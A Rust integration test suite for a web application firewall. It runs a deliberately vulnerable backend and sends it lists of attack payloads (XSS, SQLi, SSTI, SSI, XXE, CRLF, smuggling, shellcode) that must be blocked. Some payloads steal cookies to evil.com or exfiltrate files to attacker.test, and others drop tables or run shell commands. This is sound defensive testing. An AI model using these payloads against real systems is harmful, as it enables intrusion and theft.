//! End-to-end integration tests: Axum micro-backend + KrakenWAF (--no-tls).
//!
//! Topology
//! --------
//!   reqwest  →  KrakenWAF :WAF_PORT (--no-tls)  →  Axum backend :9077
//!
//! The backend is started once for the whole test binary via `BACKEND_ONCE`.
//! Each test gets its own WAF port (atomically allocated) so tests can run
//! without port collisions even when the OS puts a closed socket in TIME_WAIT.
//!
//! Backend routes
//! --------------
//!   GET  /test_one   → HTML form (GET → /test_get)
//!   GET  /test_get   → renders `payload_test` query param unsanitised in <h1>
//!   GET  /test_two   → HTML form (POST → /test_post)
//!   POST /test_post  → renders `payload_test` form field unsanitised in <h1>

use axum::{
    extract::{Form, Query},
    response::Html,
    routing::{get, post},
    Router,
};
use reqwest::StatusCode;
use serde::Deserialize;
use std::{
    net::SocketAddr,
    process::{Child, Command, Stdio},
    sync::{
        atomic::{AtomicU16, Ordering},
        OnceLock,
    },
    time::Duration,
};

// ─── Port allocation ──────────────────────────────────────────────────────────

const BACKEND_PORT: u16 = 9077;
static NEXT_WAF_PORT: AtomicU16 = AtomicU16::new(9090);

fn alloc_waf_port() -> u16 {
    NEXT_WAF_PORT.fetch_add(1, Ordering::SeqCst)
}

fn backend_addr() -> String {
    format!("127.0.0.1:{BACKEND_PORT}")
}

fn waf_base(port: u16) -> String {
    format!("http://127.0.0.1:{port}")
}

// ─── Axum backend (started once) ─────────────────────────────────────────────

static BACKEND_ONCE: OnceLock<()> = OnceLock::new();

#[derive(Deserialize)]
struct Payload {
    #[serde(default)]
    payload_test: String,
}

async fn test_one() -> Html<&'static str> {
    Html(
        r#"<html><body>
           <form method="GET" action="/test_get">
             <input name="payload_test"/><input type="submit" value="Go"/>
           </form></body></html>"#,
    )
}

async fn test_get(Query(p): Query<Payload>) -> Html<String> {
    Html(format!("<h1>{}</h1>", p.payload_test))
}

async fn test_two() -> Html<&'static str> {
    Html(
        r#"<html><body>
           <form method="POST" action="/test_post">
             <input name="payload_test"/><input type="submit" value="Go"/>
           </form></body></html>"#,
    )
}

async fn test_post(Form(p): Form<Payload>) -> Html<String> {
    Html(format!("<h1>{}</h1>", p.payload_test))
}

/// Returns a realistic /etc/passwd dump — blocked by Anti_passwd_leak.
async fn leak_passwd() -> &'static str {
    "root:x:0:0:root:/root:/bin/bash\n\
     daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\
     bin:x:2:2:bin:/bin:/usr/sbin/nologin\n\
     nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
}

/// Returns a realistic /etc/shadow dump — blocked by Anti_passwd_leak.
async fn leak_shadow() -> &'static str {
    "root:$6$salt$longhash:19000:0:99999:7:::\n\
     daemon:*:18858:0:99999:7:::\n\
     nobody:*:18858:0:99999:7:::\n"
}

/// Java deserialization target endpoint — accepts any POST body; the WAF must
/// block requests containing Java magic bytes before they reach this handler.
async fn java_deser_endpoint() -> &'static str {
    "ok"
}

fn ensure_backend() {
    BACKEND_ONCE.get_or_init(|| {
        let addr: SocketAddr = backend_addr().parse().unwrap();
        std::thread::spawn(move || {
            tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .unwrap()
                .block_on(async move {
                    let app = Router::new()
                        .route("/test_one", get(test_one))
                        .route("/test_get", get(test_get))
                        .route("/test_two", get(test_two))
                        .route("/test_post", post(test_post))
                        .route("/leak/passwd", get(leak_passwd))
                        .route("/leak/shadow", get(leak_shadow))
                        .route("/java-deser", post(java_deser_endpoint));
                    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
                    axum::serve(listener, app).await.unwrap();
                });
        });
        // Allow the listener to bind before any WAF is pointed at it.
        std::thread::sleep(Duration::from_millis(300));
    });
}

// ─── WAF subprocess helpers ───────────────────────────────────────────────────

struct WafGuard {
    child: Child,
    _tmpdir: tempfile::TempDir, // keeps the temp workdir alive; WAF gets its own SQLite DB
}

impl Drop for WafGuard {
    fn drop(&mut self) {
        self.child.kill().ok();
        self.child.wait().ok();
    }
}

fn spawn_waf(waf_port: u16, extra_args: &[&str]) -> WafGuard {
    let project_root = env!("CARGO_MANIFEST_DIR");
    let rules_dir = format!("{project_root}/rules");
    let listen = format!("127.0.0.1:{waf_port}");
    let upstream = format!("http://{}", backend_addr());

    // Each WAF instance gets its own temp workdir so their SQLite databases
    // don't conflict when tests run in parallel.
    let tmpdir = tempfile::tempdir().expect("failed to create temp dir for WAF");

    let child = Command::new(env!("CARGO_BIN_EXE_krakenwaf"))
        .args([
            "--no-tls",
            "--allow-private-upstream",
            "--listen",
            &listen,
            "--upstream",
            &upstream,
            "--rules-dir",
            &rules_dir,
        ])
        .args(extra_args)
        .current_dir(tmpdir.path())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("failed to spawn krakenwaf binary");

    WafGuard {
        child,
        _tmpdir: tmpdir,
    }
}

fn spawn_waf_with_cmc(waf_port: u16) -> WafGuard {
    let project_root = env!("CARGO_MANIFEST_DIR");
    let cmc_config = format!("{project_root}/rules/cmc/config.yaml");
    spawn_waf(waf_port, &["--cmc-load", &cmc_config])
}

/// Poll the WAF health endpoint until it responds (or timeout).
async fn wait_for_waf(client: &reqwest::Client, waf_port: u16) {
    let health_url = format!("{}/__krakenwaf/health", waf_base(waf_port));
    for _ in 0..60 {
        if client
            .get(&health_url)
            .timeout(Duration::from_millis(500))
            .send()
            .await
            .is_ok()
        {
            return;
        }
        tokio::time::sleep(Duration::from_millis(300)).await;
    }
    panic!("KrakenWAF on port {waf_port} did not become ready in time");
}

fn http_client() -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

// ─── Payload lists ───────────────────────────────────────────────────────────

/// 50 classic XSS payloads — all must be blocked when sent in a POST body.
const XSS_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "<script src=http://evil.com/x.js></script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)></video>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "<img/src=x onerror=alert(1)>",
    "\"/><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<script>fetch('http://evil.com?c='+document.cookie)</script>",
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<img src=\"javascript:alert('xss')\">",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<button onclick=alert(1)>click</button>",
    "<div onmouseover=alert(1)>hover</div>",
    "<p onmouseenter=alert(1)>",
    "<table background=javascript:alert(1)>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<script>window['al'+'ert'](1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<<script>alert(1)//<</script>",
    "<script/src=data:,alert(1)>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext></mtext><mglyph><svg><mtext></mtext><svg onload=alert(1)>",
    "<script>alert`1`</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>setInterval('alert(1)',999999)</script>",
    "<style>*{background:url('javascript:alert(1)')}</style>",
    "<base href=javascript:alert(1)//>",
    "<bgsound src=javascript:alert(1)>",
    "<!--<img src=\"--><img src=x onerror=alert(1)//>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
];

/// 50 classic SQLi payloads — all must be blocked when sent in a GET query.
const SQLI_PAYLOADS: &[&str] = &[
    "' or '1'='1",
    "' or '1'='1'--",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or ('1'='1",
    "') or ('1'='1'--",
    "' or 'x'='x",
    "1' or '1'='1",
    "1 or 1=1",
    "union select 1,2,3--",
    "union select null,null,null--",
    "union select @@version,null,null--",
    "' union select 1,2,3--",
    "' union select null,null--",
    "' union all select null--",
    "1; drop table users--",
    "1; select * from users--",
    "'; exec xp_cmdshell('dir')--",
    "'; exec master..xp_cmdshell('dir')--",
    "1 and 1=1",
    "1 and 1=2",
    "' and '1'='1",
    "' and 1=1--",
    "' and sleep(5)--",
    "1 and sleep(5)",
    "1; waitfor delay '0:0:5'--",
    "' waitfor delay '0:0:5'--",
    "1 and benchmark(5000000,md5(1))#",
    "' and (select * from (select(sleep(5)))a)--",
    "1' and extractvalue(1,concat(0x7e,(select version())))--",
    "' and updatexml(1,concat(0x7e,(select version())),1)--",
    "1 or (select 1 from dual where 1=1)--",
    "' or (select 1 from dual where 1=1)--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 2>1--",
    "' having 1=1--",
    "' group by 1--",
    "' order by 1--",
    "' order by 100--",
    "1; insert into users values('hack','hack')--",
    "1; update users set password='hack'--",
    "' or ''='",
    "' or 0=0--",
    "' or 0=0#",
    "\" or 0=0--",
    "\" or \"\"=\"",
    "' or true--",
];

/// Scanner User-Agents sampled from rules/user_agents/scanners.txt — all must
/// be blocked on any request, regardless of payload.
const SCANNER_UAS: &[&str] = &[
    "nikto/2.1.6",
    "sqlmap/1.7",
    "Nmap Scripting Engine",
    "masscan/1.3",
    "nessus/10.0",
    "openvas/21.4",
    "gobuster/3.6",
    "dirbuster/1.0",
    "arachni/1.5",
    "nuclei/2.9",
    "wfuzz/3.1",
    "commix/3.8",
    "Mozilla/5.0 (compatible; netsparker/6.0)",
    "havij/1.17",
    "Acunetix Web Vulnerability Scanner",
];

/// Overflow/flooding and shellcode payloads covered by the CMC anomaly detector.
const OVERFLOW_PAYLOADS: &[&str] = &[
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "1111111111111111111111111111111111111111",
    "%00%00%00%00%00%00%00%00%00%00%00%00",
    "%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff",
    "{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{",
    "))))))))))))))))))))))))))))))))))))))))",
    "../../../../../../../../../../../../etc/passwd",
    "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n",
    "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
    "id=12345678901234567890123456789012345678901234567890",
    r"\x90\x90\x90\x90\xcc",
    r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
    r"\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x6a\x3b\x58\x0f\x05",
    r"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68",
    "0x6a0x3b0x580x0f0x05",
];

/// 10 SSTI payloads covered by the CMC anomaly detector.
const SSTI_PAYLOADS: &[&str] = &[
    "{{7*7}}",
    "{{= 7*7 }}",
    "${7*7}",
    "#{7*7}",
    "<%= 7 * 7 %>",
    "<% system('id') %>",
    "{% debug %}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "#set($x = 7 * 7)${x}",
    "[[${7*7}]]",
];

/// 10 SSI injection payloads covered by the CMC anomaly detector.
const SSI_PAYLOADS: &[&str] = &[
    "<!--#include file=\"/etc/passwd\" -->",
    "<!--#include virtual=\"/admin/config\" -->",
    "<!--#exec cmd=\"id\" -->",
    "<!--#echo var=\"DOCUMENT_ROOT\" -->",
    "<!--#printenv -->",
    "<!--#config errmsg=\"owned\" -->",
    "<!-- #exec cmd=\"/bin/sh -c id\" -->",
    "<!--# set var=\"x\" value=\"owned\" -->",
    "<!--#if expr=\"$QUERY_STRING\" -->",
    "%3C%21--%23exec%20cmd%3D%22id%22%20--%3E",
];

/// 10 ESI injection payloads covered by the CMC anomaly detector.
const ESI_PAYLOADS: &[&str] = &[
    "<esi:include src=\"http://attacker.test/poc\" />",
    "<esi:inline name=\"frag\">owned</esi:inline>",
    "<esi:debug/>",
    "<!--esi <esi:include src=\"http://attacker.test/x\" /> -->",
    "<esi:vars>$(HTTP_COOKIE)</esi:vars>",
    "<esi:remove><script>alert(1)</script></esi:remove>",
    "<esi:choose><esi:when test=\"$(QUERY_STRING)\">x</esi:when></esi:choose>",
    "<esi:try><esi:attempt>x</esi:attempt><esi:except>y</esi:except></esi:try>",
    "<ESI:INCLUDE SRC=\"http://attacker.test/case\" />",
    "%3Cesi%3Ainclude%20src%3D%22http%3A%2F%2Fattacker.test%2Fencoded%22%20%2F%3E",
];

/// CRLF injection payloads sampled from payload-box/crlf-injection-payload-list.
const CRLF_PAYLOADS: &[&str] = &[
    "%0d%0aSet-Cookie:admin=true",
    "%0aSet-Cookie:admin=true",
    "%0dSet-Cookie:admin=true",
    "%0d%0aLocation:http://evil.com",
    "%0d%0aHTTP/1.1%20200%20OK%0d%0a",
    "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
    "%0d%0aContent-Length:%200%0d%0a%0d%0a",
    "%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
    "%250d%250aSet-Cookie:admin=true",
    "%25250d%25250aSet-Cookie:admin=true",
    "%u000d%u000aSet-Cookie:admin=true",
    r"\u000d\u000aSet-Cookie:admin=true",
    r"\r\nSet-Cookie:admin=true",
    "%E5%98%8A%E5%98%8DSet-Cookie:admin=true",
    "%C4%8D%C4%8ASet-Cookie:admin=true",
    "%e0%80%8d%e0%80%8aSet-Cookie:admin=true",
    "%00%0d%0aSet-Cookie:admin=true",
    "%0d%0a%20Set-Cookie:admin=true",
    "%0d%0a%09Set-Cookie:admin=true",
    "test%0d%0aX-Forwarded-Host:evil.com",
];

/// Request smuggling payloads covered by the CMC anomaly detector.
const REQUEST_SMUGGLING_PAYLOADS: &[&str] = &[
    "Transfer-Encoding: chunked",
    "transfer-encoding: chunked",
    "Transfer-Encoding:%20chunked",
    "Transfer-Encoding:%09chunked",
    "X-Session-Hijack: true",
    "x-session-hijack:%20true",
    "Content-Length: 0",
    "Content-Length: 4",
    "GET / HTTP/1.1%0d%0aTransfer-Encoding: chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
    "POST / HTTP/1.1%0d%0aContent-Length: 3%0d%0a%0d%0aabc",
];

/// NoSQL injection payloads covered by the CMC anomaly detector.
const NOSQL_INJECTION_PAYLOADS: &[&str] = &[
    r#"{"user":{"$gt":""},"pass":"admin"}"#,
    r#"{"password":{"$ne":null},"$where":"this.password.match(/admin/)"}"#,
    r#"selector[$where]=this.password.match(/admin/)"#,
    r#"{"$or":[{"user":"admin"},{"pass":"root"}]}"#,
    r#"{"$and":[{"user":"admin"},{"pass":{"$exists":true}}]}"#,
    r#"{"$where":"sleep(5000) || true"}"#,
    r#"{"$nin":["admin","root"],"user":"undefined"}"#,
    r#"{"$in":["admin","user"],"success":true}"#,
    r#"{"$comment":"login admin pass"}"#,
    r#"db.stores.mapReduce(function(){return true},function(){})"#,
    r#"db.injection.insert({user:"admin",pass:null})"#,
    r#"{"$remove":"logins","admin":true}"#,
    r#"{"$save":{"user":"root"},"Date":"new%20Date()"}"#,
    r#"{"$where":"this.age==7 && user==admin"}"#,
    r#"{"$or":[{}], "token":"%00"}"#,
];

/// XXE payloads covered by the CMC anomaly detector, including UTF-16LE bytes
/// represented as percent-encoding so they exercise the WAF decode path.
const XXE_ATTACK_PAYLOADS: &[&str] = &[
    r#"<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>"#,
    r#"<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY send SYSTEM "http://attacker.test/exfil">]><x>&send;</x>"#,
    r#"<!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/password">]><soap>&xxe;</soap>"#,
    r#"<xi:include href="file:///etc/passwd" xmlns:xi="http://www.w3.org/2001/XInclude"/>"#,
    r#"<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/password"/></root>"#,
    r#"<!DOCTYPE data [<!ENTITY eval SYSTEM "php://filter/read=convert.base64-encode/resource=file">]>"#,
    r#"<!DOCTYPE xxe [<!ENTITY % exfil SYSTEM "http://attacker.test/evil.dtd">%exfil;]>"#,
    r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>"#,
    r#"<!DOCTYPE xxe [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><x>&file;</x>"#,
    r#"<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "gopher://127.0.0.1/send">]><x>&xxe;</x>"#,
    r#"<soap:Envelope><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]></soap:Envelope>"#,
    r#"<!DOCTYPE xxe [<!ENTITY xxe "send exfil">]><x>&xxe;</x>"#,
    r#"<!ENTITY xxe SYSTEM "file:///etc/password">"#,
    r#"<root><xi:include href="http://attacker.test/xxe" xmlns:xi="urn:xi"/></root>"#,
    "%3C%00!%00D%00O%00C%00T%00Y%00P%00E%00%20%00x%00x%00e%00%20%00%5B%00%3C%00!%00E%00N%00T%00I%00T%00Y%00%20%00x%00x%00e%00%20%00S%00Y%00S%00T%00E%00M%00%20%00%22%00f%00i%00l%00e%00:%00/%00/%00/%00e%00t%00c%00/%00p%00a%00s%00s%00w%00d%00%22%00%3E%00%5D%00%3E%00",
];

/// URI paths with backup/temp/leak extensions — must be blocked by the
/// Anti_exposed_backup CMC on GET/HEAD; POST to the same path must pass through.
const BACKUP_URI_PATHS: &[&str] = &[
    "/wp-config.php.bak",
    "/database.sql.bak",
    "/.env",
    "/app/.env",
    "/config/settings.bkp",
    "/var/www/html/config.backup",
    "/admin/users.old",
    "/src/config.orig",
    "/backup/db.save",
    "/files/export.sav",
    "/editor/.config.php.swp",
    "/home/.viminfo.swn",
    "/tmp/session.tmp",
    "/cache/render.temp",
    "/.htpasswd.bak",
    "/prod.dump",
    "/sql/migration.sql.",
];

// ─── Tests ────────────────────────────────────────────────────────────────────

/// Sweep 50 XSS payloads via POST body — every one must be blocked (HTTP 403).
#[tokio::test]
async fn xss_payload_sweep_post() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in XSS_PAYLOADS {
        let resp = client
            .post(format!("{}/test_post", waf_base(port)))
            .form(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("request failed for XSS payload {payload:?}: {e}"));

        assert_eq!(
            resp.status(),
            StatusCode::FORBIDDEN,
            "XSS payload not blocked: {payload:?}"
        );
    }
}

/// Sweep 50 SQLi payloads via GET query — every one must be blocked (HTTP 403).
#[tokio::test]
async fn sqli_payload_sweep_get() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in SQLI_PAYLOADS {
        let resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("request failed for SQLi payload {payload:?}: {e}"));

        assert_eq!(
            resp.status(),
            StatusCode::FORBIDDEN,
            "SQLi payload not blocked: {payload:?}"
        );
    }
}

/// Send a GET with a benign query param but a scanner User-Agent from
/// scanners.txt — the UA alone must trigger a block (HTTP 403).
#[tokio::test]
async fn scanner_ua_sweep() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for ua in SCANNER_UAS {
        let resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", "hello world")]) // clean payload
            .header("User-Agent", *ua)
            .send()
            .await
            .unwrap_or_else(|e| panic!("request failed for UA {ua:?}: {e}"));

        assert_eq!(
            resp.status(),
            StatusCode::FORBIDDEN,
            "Scanner UA not blocked: {ua:?}"
        );
    }
}

/// A request from a blocklisted IP (via X-Real-IP + trusted proxy CIDR) is
/// blocked with HTTP 403.  The IP `10.10.10.1` is present in
/// `rules/addr/blocklist.txt`; we configure the WAF to trust the loopback
/// as a proxy so the X-Real-IP header is honoured.
#[tokio::test]
async fn blocklisted_ip_is_blocked() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(
        port,
        &[
            "--blocklist-ip",
            "--real-ip-header",
            "X-Real-IP",
            "--trusted-proxy-cidrs",
            "127.0.0.1/32",
        ],
    );
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .get(format!("{}/test_one", waf_base(port)))
        .header("X-Real-IP", "10.10.10.1")
        .send()
        .await
        .unwrap();

    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
}

/// Clean traffic with an innocuous payload passes through and reaches the
/// backend (HTTP 200).
#[tokio::test]
async fn clean_get_passes_through() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .get(format!("{}/test_get", waf_base(port)))
        .query(&[("payload_test", "hello world")])
        .send()
        .await
        .unwrap();

    assert_eq!(resp.status(), StatusCode::OK);
}

/// Clean POST passes through and reaches the backend (HTTP 200).
#[tokio::test]
async fn clean_post_passes_through() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .post(format!("{}/test_post", waf_base(port)))
        .form(&[("payload_test", "safe value")])
        .send()
        .await
        .unwrap();

    assert_eq!(resp.status(), StatusCode::OK);
}

/// A normal browser-style request to /login.php must not be blocked by the CRLF CMC.
#[tokio::test]
async fn cmc_crlf_does_not_block_clean_login_request() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    let resp = client
        .get(format!("{}/login.php", waf_base(port)))
        .header("Connection", "keep-alive")
        .header("Upgrade-Insecure-Requests", "1")
        .header("User-Agent", "Mozilla/5.0")
        .header(
            "Accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        )
        .header("Sec-Fetch-Site", "none")
        .header("Sec-Fetch-Mode", "navigate")
        .header("Accept-Encoding", "gzip, deflate, br")
        .header("Accept-Language", "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7")
        .header("Cookie", "PHPSESSID=abc123")
        .send()
        .await
        .unwrap();

    assert_ne!(resp.status(), StatusCode::FORBIDDEN);
}

/// Sweep the same 50 XSS payloads via GET query — every one must be blocked (403).
/// Mirrors xss_payload_sweep_post to confirm URI-phase rules cover the same vectors.
#[tokio::test]
async fn xss_payload_sweep_get() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in XSS_PAYLOADS {
        let resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("request failed for XSS GET payload {payload:?}: {e}"));

        assert_eq!(
            resp.status(),
            StatusCode::FORBIDDEN,
            "XSS GET payload not blocked: {payload:?}"
        );
    }
}

/// Sweep the same 50 SQLi payloads via POST body — every one must be blocked (403).
/// Mirrors sqli_payload_sweep_get to confirm body-phase rules cover the same vectors.
#[tokio::test]
async fn sqli_payload_sweep_post() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf(port, &[]);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in SQLI_PAYLOADS {
        let resp = client
            .post(format!("{}/test_post", waf_base(port)))
            .form(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("request failed for SQLi POST payload {payload:?}: {e}"));

        assert_eq!(
            resp.status(),
            StatusCode::FORBIDDEN,
            "SQLi POST payload not blocked: {payload:?}"
        );
    }
}

/// CMC overflow detection must block anomaly payloads in URI and POST body.
#[tokio::test]
async fn cmc_overflow_payload_sweep_get_and_post() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in OVERFLOW_PAYLOADS {
        let get_resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("GET request failed for overflow payload {payload:?}: {e}"));

        assert_eq!(
            get_resp.status(),
            StatusCode::FORBIDDEN,
            "Overflow GET payload not blocked: {payload:?}"
        );

        let post_resp = client
            .post(format!("{}/test_post", waf_base(port)))
            .form(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| {
                panic!("POST request failed for overflow payload {payload:?}: {e}")
            });

        assert_eq!(
            post_resp.status(),
            StatusCode::FORBIDDEN,
            "Overflow POST payload not blocked: {payload:?}"
        );
    }
}

/// CMC SSTI detection must block template injection payloads in URI and POST body.
#[tokio::test]
async fn cmc_ssti_payload_sweep_get_and_post() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in SSTI_PAYLOADS {
        let get_resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("GET request failed for SSTI payload {payload:?}: {e}"));

        assert_eq!(
            get_resp.status(),
            StatusCode::FORBIDDEN,
            "SSTI GET payload not blocked: {payload:?}"
        );

        let post_resp = client
            .post(format!("{}/test_post", waf_base(port)))
            .form(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("POST request failed for SSTI payload {payload:?}: {e}"));

        assert_eq!(
            post_resp.status(),
            StatusCode::FORBIDDEN,
            "SSTI POST payload not blocked: {payload:?}"
        );
    }
}

/// CMC SSI detection must block SSI injection payloads in URI and POST body.
#[tokio::test]
async fn cmc_ssi_payload_sweep_get_and_post() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in SSI_PAYLOADS {
        let get_resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("GET request failed for SSI payload {payload:?}: {e}"));

        assert_eq!(
            get_resp.status(),
            StatusCode::FORBIDDEN,
            "SSI GET payload not blocked: {payload:?}"
        );

        let post_resp = client
            .post(format!("{}/test_post", waf_base(port)))
            .form(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("POST request failed for SSI payload {payload:?}: {e}"));

        assert_eq!(
            post_resp.status(),
            StatusCode::FORBIDDEN,
            "SSI POST payload not blocked: {payload:?}"
        );
    }
}

/// CMC ESI detection must block ESI injection payloads in URI and POST body.
#[tokio::test]
async fn cmc_esi_payload_sweep_get_and_post() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in ESI_PAYLOADS {
        let get_resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("GET request failed for ESI payload {payload:?}: {e}"));

        assert_eq!(
            get_resp.status(),
            StatusCode::FORBIDDEN,
            "ESI GET payload not blocked: {payload:?}"
        );

        let post_resp = client
            .post(format!("{}/test_post", waf_base(port)))
            .form(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("POST request failed for ESI payload {payload:?}: {e}"));

        assert_eq!(
            post_resp.status(),
            StatusCode::FORBIDDEN,
            "ESI POST payload not blocked: {payload:?}"
        );
    }
}

/// CMC CRLF detection must block CRLF injection payloads in URI and POST body.
#[tokio::test]
async fn cmc_crlf_payload_sweep_get_and_post() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in CRLF_PAYLOADS {
        let get_resp = client
            .get(format!("{}/test_get", waf_base(port)))
            .query(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("GET request failed for CRLF payload {payload:?}: {e}"));

        assert_eq!(
            get_resp.status(),
            StatusCode::FORBIDDEN,
            "CRLF GET payload not blocked: {payload:?}"
        );

        let post_resp = client
            .post(format!("{}/test_post", waf_base(port)))
            .form(&[("payload_test", payload)])
            .send()
            .await
            .unwrap_or_else(|e| panic!("POST request failed for CRLF payload {payload:?}: {e}"));

        assert_eq!(
            post_resp.status(),
            StatusCode::FORBIDDEN,
            "CRLF POST payload not blocked: {payload:?}"
        );
    }
}

/// CMC request smuggling detection must block smuggling payloads in URI and POST body.
#[tokio::test]
async fn cmc_request_smuggling_payload_sweep_get_and_post() {
    ensure_backend();
    let port = alloc_waf_port();
    let _waf = spawn_waf_with_cmc(port);
    let client = http_client();
    wait_for_waf(&client, port).await;

    for payload in REQUEST_SMUGGLING_PAYLOADS {
        let get_resp = client
